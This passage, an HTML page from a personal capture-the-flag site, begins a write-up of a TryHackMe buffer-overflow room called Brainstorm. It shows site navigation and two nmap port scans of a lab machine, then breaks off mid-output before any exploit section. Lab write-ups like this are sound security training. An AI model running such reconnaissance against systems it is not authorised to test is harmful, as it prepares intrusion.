@@ -1,0 +1,1837 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../brainpan/">
+      
+      
+        <link rel="next" href="../chillhack/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Brainstorm - rdrg0x</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#brainstorm" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            rdrg0x
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Brainstorm
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    rdrg0x
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackme
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackme
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alfred
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../atlas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attackingkerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attacktivedirectory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacktive Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blaster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blaster
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blueprint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blueprint
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bolt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../brainpan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainpan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainstorm
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainstorm
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bof" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BoF
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BoF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FUZZ
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shellcode
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bytearrays" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bytearrays
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcodes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OpCodes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chillhack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chill Hack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bof" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BoF
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BoF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FUZZ
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shellcode
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bytearrays" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bytearrays
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcodes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OpCodes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../HackTheBox/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../alfred/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    TryHackme
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:bufferoverflow" class="md-tag">bufferoverflow</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:windows" class="md-tag">windows</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="brainstorm">Brainstorm<a class="headerlink" href="#brainstorm" title="Permanent link">&para;</a></h1>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.201.14.163<span class="w"> </span>-oG<span class="w"> </span>allPorts
+
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+<span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">  </span>ftp
+<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server
+<span class="m">9999</span>/tcp<span class="w"> </span>open<span class="w">  </span>abyss
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p21,3389,9999<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.201.14.163<span class="w"> </span>-oN<span class="w"> </span>target<span class="w">             </span>
+
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">    </span>VERSION
+<span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">  </span>ftp<span class="w">        </span>Microsoft<span class="w"> </span>ftpd
+<span class="p">|</span><span class="w"> </span>ftp-syst:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">  </span>SYST:<span class="w"> </span>Windows_NT
+<span class="p">|</span><span class="w"> </span>ftp-anon:<span class="w"> </span>Anonymous<span class="w"> </span>FTP<span class="w"> </span>login<span class="w"> </span>allowed<span class="w"> </span><span class="o">(</span>FTP<span class="w"> </span>code<span class="w"> </span><span class="m">230</span><span class="o">)</span>
+<span class="p">|</span>_Can<span class="w"> </span>t<span class="w"> </span>get<span class="w"> </span>directory<span class="w"> </span>listing:<span class="w"> </span>TIMEOUT
+<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>tcpwrapped
+<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>BRAINSTORM
+<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>BRAINSTORM
+<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>BRAINSTORM
+<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>brainstorm
+<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>brainstorm
+<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">6</span>.1.7601
+<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-09-28T06:39:44+00:00
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>brainstorm
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-09-27T06:34:20
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-03-29T06:34:20
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-09-28T06:40:15+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="m">9999</span>/tcp<span class="w"> </span>open<span class="w">  </span>abyss?
+<span class="p">|</span><span class="w"> </span>fingerprint-strings:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>DNSStatusRequestTCP,<span class="w"> </span>DNSVersionBindReqTCP,<span class="w"> </span>FourOhFourRequest,<span class="w"> </span>GenericLines,<span class="w"> </span>GetRequest,<span class="w"> </span>HTTPOptions,<span class="w"> </span>Help,<span class="w"> </span>JavaRMI,<span class="w"> </span>RPCCheck,<span class="w"> </span>RTSPRequest,<span class="w"> </span>SSLSessionReq,<span class="w"> </span>TerminalServerCookie:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span>Welcome<span class="w"> </span>to<span class="w"> </span>Brainstorm<span class="w"> </span>chat<span class="w"> </span><span class="o">(</span>beta<span class="o">)</span>
+<span class="p">|</span><span class="w">     </span>Please<span class="w"> </span>enter<span class="w"> </span>your<span class="w"> </span>username<span class="w"> </span><span class="o">(</span>max<span class="w"> </span><span class="m">20</span><span class="w"> </span>characters<span class="o">)</span>:<span class="w"> </span>Write<span class="w"> </span>a<span class="w"> </span>message:
+<span class="p">|</span><span class="w">   </span>NULL:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span>Welcome<span class="w"> </span>to<span class="w"> </span>Brainstorm<span class="w"> </span>chat<span class="w"> </span><span class="o">(</span>beta<span class="o">)</span>
+<span class="p">|</span>_<span class="w">    </span>Please<span class="w"> </span>enter<span class="w"> </span>your<span class="w"> </span>username<span class="w"> </span><span class="o">(</span>max<span class="w"> </span><span class="m">20</span><span class="w"> </span>characters<span class="o">)</span>:
+<span class="m">1</span><span class="w"> </span>service<span class="w"> </span>unrecognized<span class="w"> </span>despite<span class="w"> </span>returning<span class="w"> </span>data.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>the<span class="w"> </span>service/version,<span class="w"> </span>please<span class="w"> </span>submit<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>fingerprint<span class="w"> </span>at<span class="w"> </span>https://nmap.org/cgi-bin/submit.cgi?new-service<span class="w"> </span>:
+SF-Port9999-TCP:V<span class="o">=</span><span class="m">7</span>.95%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">9</span>/28%Time<span class="o">=</span>68D8D790%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
+SF:LL,52,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter</span>
+<span class="s2">SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest
+SF:,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x</span>
+<span class="s2">SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes</span>
+<span class="s2">SF:sage:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(</span>
+<span class="s2">SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character</span>
+<span class="s2">SF:s\):\x20Write\x20a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,63,<span class="s2">&quot;Welcome\x2</span>
+<span class="s2">SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern</span>
+<span class="s2">SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>J
+SF:avaRMI,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e</span>
+<span class="s2">SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\</span>
+<span class="s2">SF:x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20cha</span>
+<span class="s2">SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch</span>
+<span class="s2">SF:aracters\):\x20Write\x20a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,63,<span class="s2">&quot;Welcome\x</span>
+<span class="s2">SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user</span>
+<span class="s2">SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>
+SF:RPCCheck,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2</span>
+<span class="s2">SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20</span>
+<span class="s2">SF:a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,63,<span class="s2">&quot;Welcome\x20to\x20Brainst</span>
+<span class="s2">SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x</span>
+<span class="s2">SF:2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusReques
+SF:tTCP,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent</span>
+<span class="s2">SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2</span>
